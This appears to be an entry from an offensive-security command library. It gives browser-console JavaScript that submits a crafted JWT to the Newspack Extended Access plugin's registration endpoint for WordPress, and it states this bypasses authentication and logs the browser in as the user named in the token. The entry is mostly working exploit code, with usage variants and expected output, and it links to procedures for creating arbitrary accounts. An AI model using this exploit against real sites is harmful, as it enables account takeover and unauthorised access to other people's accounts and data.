---
id: cmd-001
data: >-
  // Endpoint URL

  let url =
  `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;

  // JWT contents - this JWT contains email "test@example.org".

  let token =
  "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIiwiaWF0IjoxNzEzNjY2NjQ5LCJleHAiOjE3MTM2NzAyNDl9.I8D18nWsn5H6AylwJdak8727APyiMCWkcnXH95vMF_k";

  // Provide token to authentication endpoint.

  fetch(
   url,
   {
    cache: 'no-store',
    method: 'POST',
    headers: {
     'Content-type': 'text/plain',
    },
    body: token
   }
  ).then(response => {
   console.log(response.json(), 'response');
  })
tags:
  - auth-bypass
  - jwt
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:31:42.860Z'
verified: false
validated: true
submitted: true
---
# submit-jwt-via-browser-console

## Command

```javascript
// Endpoint URL
let url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;
// JWT contents - this JWT contains email "test@example.org".
let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIiwiaWF0IjoxNzEzNjY2NjQ5LCJleHAiOjE3MTM2NzAyNDl9.I8D18nWsn5H6AylwJdak8727APyiMCWkcnXH95vMF_k";
// Provide token to authentication endpoint.
fetch(
 url,
 {
  cache: 'no-store',
  method: 'POST',
  headers: {
   'Content-type': 'text/plain',
  },
  body: token
 }
).then(response => {
 console.log(response.json(), 'response');
})
```

## Description

Executes a POST request from the browser console to submit an unsigned JWT token to the Newspack plugin's registration endpoint, bypassing authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Dynamically constructed endpoint URL | Yes |
| token | Unsigned JWT string with target payload | Yes |
| cache | 'no-store' to avoid caching | Yes |
| method | 'POST' for submission | Yes |
| headers | {'Content-type': 'text/plain'} for body format | Yes |
| body | The JWT token as plain text | Yes |

## Examples

### Basic Usage

```javascript
// Replace token with your generated one
let token = "your-jwt-here";
fetch(url, { method: 'POST', body: token, headers: {'Content-type': 'text/plain'} }).then(r => r.json()).then(console.log);
```

### Advanced Usage

```javascript
// With error handling
fetch(url, { /* options */ }).then(response => response.ok ? response.json() : console.error('Failed')).catch(console.error);
```

## Expected Output

Console logs JSON response like {"success": true, "data": {...}}, and browser authenticates as the user in the token.

## Related

- [[procedures/Submit-JWT-to-Registration-Endpoint]]
- [[procedures/Create-Arbitrary-User-Account]]
